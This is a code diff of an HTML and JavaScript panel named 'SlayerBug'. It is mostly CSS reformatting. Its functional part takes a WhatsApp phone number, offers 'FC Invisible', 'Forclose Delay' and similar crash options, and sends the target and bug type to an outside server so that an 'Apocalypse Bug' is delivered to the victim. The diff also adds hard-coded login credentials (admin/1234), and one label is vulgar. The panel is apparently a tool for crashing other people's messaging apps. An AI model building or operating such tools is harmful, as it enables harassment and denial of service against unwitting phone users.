@@ -31,20 +31,18 @@
     .status i { color: #ffffff; margin-right: 5px; }
     h1 { font-size: 1.4rem; color: var(--main); margin-bottom: 20px; text-align: center; animation: neon 2s infinite alternate; }
     .neon {
-  color: #0ff;
-  text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 20px #0ff;
-  animation: flicker 1.5s infinite alternate;
-}
-
-@keyframes flicker {
-  0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
-    opacity: 1;
-  }
-  20%, 24%, 55% {
-    opacity: 0.4;
-  }
-}
-    @keyframes neon { from { text-shadow: 0 0 10px var(--main); } to { text-shadow: 0 0 25px var(--second); } }
+      color: #0ff;
+      text-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 20px #0ff;
+      animation: flicker 1.5s infinite alternate;
+    }
+    @keyframes flicker {
+      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
+      20%, 24%, 55% { opacity: 0.4; }
+    }
+    @keyframes neon {
+      from { text-shadow: 0 0 10px var(--main); }
+      to { text-shadow: 0 0 25px var(--second); }
+    }
     input {
       background: rgba(255, 255, 255, 0.05);
       color: white;
@@ -108,37 +106,34 @@
       background: rgba(255, 255, 255, 0.2);
     }
     #popup {
-  position: fixed;
-  top: 0; left: 0; width: 100%; height: 100%;
-  background: rgba(0, 0, 0, 0.6);
-  display: flex; justify-content: center; align-items: center;
-  z-index: 999;
-}
-
-.popup-content {
-  background: #1a1a1a;
-  color: #00ff88;
-  padding: 30px;
-  border-radius: 15px;
-  text-align: center;
-  max-width: 90%;
-  box-shadow: 0 0 20px #00ff88;
-  animation: fadeIn 0.3s ease-in-out;
-  position: relative;
-}
-
-.popup-content .close-btn {
-  position: absolute;
-  top: 10px; right: 15px;
-  font-size: 1.5rem;
-  color: #ff4d4d;
-  cursor: pointer;
-}
-
-@keyframes fadeIn {
-  from { opacity: 0; transform: scale(0.9); }
-  to { opacity: 1; transform: scale(1); }
-}
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      display: flex; justify-content: center; align-items: center;
+      z-index: 999;
+    }
+    .popup-content {
+      background: #1a1a1a;
+      color: #00ff88;
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      max-width: 90%;
+      box-shadow: 0 0 20px #00ff88;
+      animation: fadeIn 0.3s ease-in-out;
+      position: relative;
+    }
+    .popup-content .close-btn {
+      position: absolute;
+      top: 10px; right: 15px;
+      font-size: 1.5rem;
+      color: #ff4d4d;
+      cursor: pointer;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
   </style>
 </head>
 <body>
@@ -156,6 +151,13 @@
   <input type="password" id="password" placeholder="Password" />
   <button onclick="login()"><i class="fas fa-sign-in-alt"></i> Login</button>
   <div id="login-result" style="margin-top:10px; text-align:center;"></div>
+
+  <!-- Demo Login Info -->
+  <div style="margin-top:20px; font-size:0.9rem; color:#aaa; text-align:center;">
+    <p><strong>Demo Login:</strong></p>
+    <p>👤 Username: <code>admin</code></p>
+    <p>🔒 Password: <code>1234</code></p>
+  </div>
 </div>
 
 <div class="glass-box" id="main-box" style="display:none;">
@@ -168,18 +170,19 @@
   </div>
   <h1 class="neon"><i class="fab fa-whatsapp"></i> SlayerBug</h1>
   <input type="text" id="target" placeholder="628xxxx" />
-<div class="bug-options">
-  <div class="bug-card active" data-bug="crashtotal">
-    <i class="fas fa-skull-crossbones"></i><span>FC Invisible</span>
-  </div>
-  <div class="bug-card" data-bug="fc">
-    <i class="fas fa-bomb"></i><span>kontol WA</span>
-  </div>
-  <div class="bug-card" data-bug="delay">
-    <i class="fas fa-clock"></i><span>Forclose Delay</span>
-  </div>
-  <div class="bug-card" data-bug="blank">
-    <i class="fas fa-eye-slash"></i><span>WhatsApp</span>
+  <div class="bug-options">
+    <div class="bug-card active" data-bug="crashtotal">
+      <i class="fas fa-skull-crossbones"></i><span>FC Invisible</span>
+    </div>
+    <div class="bug-card" data-bug="fc">
+      <i class="fas fa-bomb"></i><span>kontol WA</span>
+    </div>
+    <div class="bug-card" data-bug="delay">
+      <i class="fas fa-clock"></i><span>Forclose Delay</span>
+    </div>
+    <div class="bug-card" data-bug="blank">
+      <i class="fas fa-eye-slash"></i><span>WhatsApp</span>
+    </div>
   </div>
   <button id="sendBtn" onclick="sendBug()"><i class="fas fa-bug"></i> Kirim Bug</button>
   <button class="small-logout" onclick="logout()">Logout</button>
@@ -306,15 +309,14 @@ async function sendBug() {
   btn.innerHTML = '<span class="spinner"></span> Mengirim...';
   resDiv.innerText = "";
 
-try {
-  const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
-  const json = await res.json();
-
-  showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);
-} catch (err) {
-  resDiv.innerText = "❌ Gagal fetch: " + err;
-  resDiv.style.color = "crimson";
-}
+  try {
+    const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
+    const json = await res.json();
+    showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);
+  } catch (err) {
+    resDiv.innerText = "❌ Gagal fetch: " + err;
+    resDiv.style.color = "crimson";
+  }
 
   btn.disabled = false;
   btn.innerHTML = originalHTML;
